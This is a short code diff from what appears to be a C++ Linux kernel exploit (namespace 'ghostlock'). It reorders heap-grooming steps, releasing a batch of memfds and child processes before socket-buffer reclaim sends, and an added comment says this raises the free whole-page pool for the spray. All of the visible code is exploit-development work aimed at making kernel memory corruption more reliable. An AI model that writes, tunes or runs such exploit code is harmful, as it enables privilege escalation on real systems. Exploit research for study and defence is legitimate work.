@@ -744,6 +744,17 @@ namespace ghostlock::support {
             pr_error("SYSCHK(close(memfd_leak)): %m\n");
         }
         session::g_exploit_session.heap.leak_memfd.reset();
+        /* v4: hand the prepare cohort's whole pages back to the buddy allocator
+         * before the reclaim sends. prepare_ctx holds a whole number of slabs
+         * (mm_objs_per_slab objects each, 8 pages in total), but it used to be
+         * released after the sends, so it never contributed to this reclaim;
+         * releasing it first raises the free whole-page pool at send time from
+         * ~8 pages to ~16 pages. */
+        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
+            SYSCHK(close(prepare_ctx.memfds[i]));
+            prepare_ctx.memfds[i] = -1;
+            kill_child(prepare_ctx.childs[i]);
+        }
         for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
             errno = 0;
             ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
@@ -753,12 +764,6 @@ namespace ghostlock::support {
         }
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
         snitch.reset();
-
-        for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
-            SYSCHK(close(prepare_ctx.memfds[i]));
-            prepare_ctx.memfds[i] = -1;
-            kill_child(prepare_ctx.childs[i]);
-        }
 
         return base;
     }
